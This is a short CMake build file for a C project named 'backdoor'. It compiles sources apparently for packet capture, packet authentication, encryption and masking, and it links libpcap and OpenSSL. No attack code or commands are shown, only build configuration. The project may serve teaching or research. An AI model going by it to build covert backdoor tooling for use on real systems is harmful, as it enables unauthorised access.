cmake_minimum_required(VERSION 3.0.0)
project(backdoor VERSION 0.1.0)

include(CTest)
enable_testing()

include(FindPCAP.cmake)

find_package(OpenSSL REQUIRED)

add_executable(backdoor main.c mask.c crypto.c packet_handler.c packet_auth.c)
target_link_libraries(backdoor ${PCAP_LIBRARY} ${OPENSSL_CRYPTO_LIBRARY})

set(CPACK_PROJECT_NAME ${PROJECT_NAME})
set(CPACK_PROJECT_VERSION ${PROJECT_VERSION})
include(CPack)
